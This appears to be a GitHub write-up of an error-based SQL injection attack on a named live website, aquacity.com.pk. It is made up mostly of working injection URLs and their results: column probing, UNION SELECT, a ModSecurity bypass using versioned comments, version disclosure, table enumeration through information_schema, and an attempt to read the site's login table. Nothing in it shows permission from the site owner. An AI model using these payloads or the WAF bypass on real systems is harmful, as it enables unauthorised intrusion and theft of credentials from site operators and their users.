## Report on aquacity
#### Purpose of the Report

This walk-through demonstrates how to identify vulnerabilities, exploit them, and gain access to website, using error based SQL injection.

arget Website
https://aquacity.com.pk/

### Steps

#### Step 01 : finding the php id
outcome: https://aquacity.com.pk/page.php?id=3 

#### Step 02 : to check numbers of page availabe we are going to use order by

https://aquacity.com.pk/page.php?id=6%20order%20by%205
.
.
https://aquacity.com.pk/page.php?id=6%20order%20by%20100

outcome: no outcome of this command as it is been blocked.

#### Step 03 : lets do it with ' --+
https://aquacity.com.pk/products.php?id=6%27%20order%20by%205%20--+

outcome: 5 pages discovered.

#### Step 04 : applying "union select" 
https://aquacity.com.pk/products.php?id=6%27%20union%20select%201,2,3,4,5--+
<img width="1080" height="359" alt="image" src="https://github.com/user-attachments/assets/84bdc2cd-eaeb-45fb-9cd2-1873e97e54f4" />

error encountered, the commands are blocked by mod security.

#### Step 05 : bypassing through mod security bypass.
https://aquacity.com.pk/page.php?id=6%27/*!12345union*/%20/*!00000select*/%201,2,3%20--+

outcome: found the vulnerable page "2 & 3"

#### Step 06 : checking the version "version()"
got the version what is : 5.7.44-48

#### Step 07 : going for database 
https://aquacity.com.pk/page.php?id=6%27/*!12345union*/%20/*!00000select*/%201,2,table_name%20/*!12312from*/%20/*!information_schema.tables*/%20--+
outcome : CHARACTER_SETS
the outcome is not as expected.

#### Step 08 : using "group_concat" to get the all database 
https://aquacity.com.pk/page.php?id=6%27/*!12345union*/%20/*!00000select*/%201,2,group_concat(table_name)%20/*!12312from*/%20/*!information_schema.tables*/%20--+

#### Step 09 : filtering out the database as it has too much data, so filtering out basis of data that is related aboutus,contacts,inquiry_carts,login,main_banner,main_cat,news,products,quality,setting...
https://aquacity.com.pk/page.php?id=6%27/*!12345union*/%20/*!00000select*/%201,2,group_concat(table_name)%20/*!12312from*/%20/*!information_schema.tables*/%20/*!12312where*/%20/*!12312table_schema*/%20=%20database()%20--+

outcome : saw a section called login, going for the view

#### Step 10 : selected the login
https://aquacity.com.pk/page.php?id=6%27/*!12345union*/%20/*!00000select*/%201,2,column_name%20/*!12312from*/%20/*!information_schema.tables*/%20/*!12312where*/%20/*!12312table_name*/%20=%20%27login%27%20--+

outcome : blank 
